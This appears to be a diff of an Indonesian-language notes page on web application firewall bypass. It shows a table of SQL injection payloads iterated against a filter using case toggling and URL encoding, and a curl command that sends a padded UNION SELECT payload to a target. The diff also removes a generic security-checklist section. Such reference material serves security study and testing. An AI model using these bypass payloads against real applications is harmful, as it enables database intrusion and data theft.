@@ -26,7 +26,7 @@ cssclasses:
 
 
 
-[[00_Atlas/hierarchy-waf-reverse-proxy]] [[00_Atlas/hierarchy-offensive]] [[00_Atlas/hierarchy-cybersecurity-defense-architecture]] [[00_Atlas/overview]]
+[[00_Atlas/hierarchy-waf-reverse-proxy]] [[00_Atlas/hierarchy-offensive]] [[00_Atlas/hierarchy-cybersecurity-defense-architecture]] [[about]]
 
 > [!info] Ringkasan
 > Referensi komprehensif teknik bypass WAF dari Awesome-WAF dan berbagai sumber. Mencakup 70+ teknik yang diklasifikasikan per kategori: obfuscation, encoding, parsing confusion, protocol-level evasion, side-channel, dan filter abuse. Setiap teknik dilengkapi contoh payload dan mekanisme countermeasure.
@@ -68,11 +68,11 @@ Bypass: 1 || (SeLeCt 1)  # Case toggling? Cek...
 | Iteration | Payload | Status | Rule Discovered |
 |---|---|---|---|
 | 1 | `1 OR 1=1` | BLOCKED | `or` keyword |
-| 2 | `1 || 1` | ALLOWED | `||` ok |
-| 3 | `1 || (select 1 from dual)` | BLOCKED | `select` keyword |
-| 4 | `1 || (SeLeCt 1)` | ALLOWED | Case sensitive filter |
-| 5 | `1 || (select/**/1)` | BLOCKED | Comment `/**/` |
-| 6 | `1 || (sel%65ct 1)` | ALLOWED | URL encoding bypass |
+| 2 | `1 \|\| 1` | ALLOWED | `\|\|` ok |
+| 3 | `1 \|\| (select 1 from dual)` | BLOCKED | `select` keyword |
+| 4 | `1 \|\| (SeLeCt 1)` | ALLOWED | Case sensitive filter |
+| 5 | `1 \|\| (select/**/1)` | BLOCKED | Comment `/**/` |
+| 6 | `1 \|\| (sel%65ct 1)` | ALLOWED | URL encoding bypass |
 
 ---
 
@@ -246,7 +246,7 @@ curl -d "data=$(python -c "print('A'*100000 + ' UNION SELECT...")" http://target
 
 ## 7. Referensi
 
-**Sumber utama:** Awesome-WAF `/mnt/data_d/Projects/Reference/Awesome-WAF/` (evasion section, 70+ teknik)
+**Sumber utama:** Awesome-WAF `https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Awesome-WAF/` (evasion section, 70+ teknik)
 
 **Cross-link vault:**
 - [[waf-reverse-proxy-deepdive]] — arsitektur WAF
@@ -255,72 +255,7 @@ curl -d "data=$(python -c "print('A'*100000 + ' UNION SELECT...")" http://target
 
 > [!callout] 💡
 > Parsing confusion (kesenjangan parser WAF vs parser aplikasi) adalah akar mayoritas bypass — perlakukan payload sebagai parser, bukan sebagai string.
+---
 
-## Deepdive Tambahan — Implementasi & Operasional
-
-### Arsitektur & Komponen Detail
-
-Sistem ini memiliki beberapa komponen yang saling bergantung. Pemahaman arsitektur end-to-end penting untuk identifikasi attack surface dan gap pertahanan.
-
-| Komponen | Fungsi | Attack Surface | Defense |
-|----------|--------|---------------|---------|
-| **Input** | Data mentah masuk | Injection, poisoning | Validate, sanitize |
-| **Processing** | Core logic | Logic flaw, bypass | Test, review |
-| **Output** | Result delivery | Leak, manipulation | Encrypt, audit |
-| **Storage** | Persist data | Exfil, tamper | Encrypt, RBAC |
-| **Network** | Transit | Intercept, MITM | TLS, mTLS |
-| **Identity** | Access control | Token theft, privesc | MFA, least privilege |
-
-### Workflow End-to-End
-
-```
-Input → Validate → Process → Store → Serve → Monitor → Audit
-  ↓       ↓         ↓         ↓       ↓        ↓        ↓
-Sanitize  Auth     Logic    Encrypt  RBAC    Alert    Log
-```
-
-### Tradeoff & Decision Matrix
-
-| Dimension | Pilihan A | Pilihan B | Factor |
-|-----------|-----------|-----------|--------|
-| Speed vs Security | Optimized | Strict validate | Risk context |
-| Memory vs Scale | In-memory | Disk-backed | Data volume |
-| Cost vs Control | Cloud managed | Self-hosted | Team capability |
-| Convenience vs Audit | Auto | Manual review | Compliance |
-
-### Best Practice Checklist
-
-- [ ] Input validation (whitelist, not blacklist)
-- [ ] Output encoding (context-aware: HTML, JS, CSS)
-- [ ] Authentication (MFA, rate limit, lockout)
-- [ ] Authorization (RBAC, least privilege, deny default)
-- [ ] Logging (structured, immutable, centralized)
-- [ ] Monitoring (latency, error, saturation, traffic)
-- [ ] Encryption (transit TLS, rest AES, key rotation)
-- [ ] Backup (test restore, offsite, immutable)
-- [ ] Patch (automated scan, SLA per severity)
-- [ ] Incident (runbook, contact, tabletop)
-
-### Common Pitfall
-
-1. **Assume input trusted**: Semua input adalah musuh → validate di server.
-2. **Secret in code**: Hardcoded credential → git leak → compromise.
-3. **Silent failure**: Error ditelan → debugging impossible → security blind.
-4. **No rate limit**: Abuse path → DoS → resource exhaustion.
-5. **Default config**: Default = insecure → harden sebelum produksi.
-
-### Tool Stack
-
-| Tool | Use |
-|------|-----|
-| Testing | Burp Suite, OWASP ZAP, ffuf |
-| Scanning | Nmap, Nuclei, Trivy |
-| Monitoring | Prometheus + Grafana |
-| Logging | ELK / Loki |
-| Secret | Vault / SOPS |
-
-## Referensi
-- OWASP Top 10 — https://owasp.org/www-project-top-ten/
-- NIST CSF — https://www.nist.gov/cyberframework
-- MITRE ATT&CK — https://attack.mitre.org/
-- CIS Controls — https://www.cisecurity.org/controls/
+audited
+---
